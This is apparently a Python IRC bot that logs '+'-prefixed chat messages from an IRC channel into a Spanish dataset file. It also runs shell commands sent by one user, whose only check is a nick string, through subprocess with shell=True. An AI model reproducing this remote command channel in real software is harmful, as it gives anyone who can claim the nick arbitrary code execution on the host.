import socket
import subprocess

# Configuración del bot
server = "irc.libera.chat"
channel = "#parati"
botnick = "sphereye"
filepath = "dataset-espanish.txt"
master_user = "Zcom"  # El nombre del Amo que puede activar comandos

def connect_and_listen():
    irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    irc.connect((server, 6667))
    irc.send(f"NICK {botnick}\r\n".encode('utf-8'))
    irc.send(f"USER {botnick} {botnick} {botnick} :Python IRC Bot\r\n".encode('utf-8'))
    irc.send(f"JOIN {channel}\r\n".encode('utf-8'))

    while True:
        data = irc.recv(2048).decode('utf-8', errors='ignore')
        print(data)

        # Mantener la conexión viva respondiendo a PING
        if data.startswith("PING"):
            irc.send(f"PONG {data.split()[1]}\r\n".encode('utf-8'))

        # Leer los mensajes del canal
        if f"PRIVMSG {channel} :" in data:
            user = get_user_from_data(data)
            message = data.split(f"PRIVMSG {channel} :")[1].strip()

            # Verificar si el mensaje comienza con +
            if message.startswith("+"):
                save_message(message[1:].strip())

            # Verificar si el mensaje es un comando para ejecutar
            if user == master_user and message.startswith(">python3.11 "):
                command = message[len(">python3.11 "):].strip()
                execute_command(command)

def get_user_from_data(data):
    """Extrae el nombre de usuario de los datos del mensaje."""
    return data.split('!')[0][1:]

def save_message(message):
    with open(filepath, "a", encoding="utf-8") as file:
        file.write(message + "\n")
    print(f"Saved: {message}")

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.returncode == 0 else result.stderr
        print(f"Command output: {output}")
    except Exception as e:
        print(f"Error executing command: {e}")

if __name__ == "__main__":
    connect_and_listen()
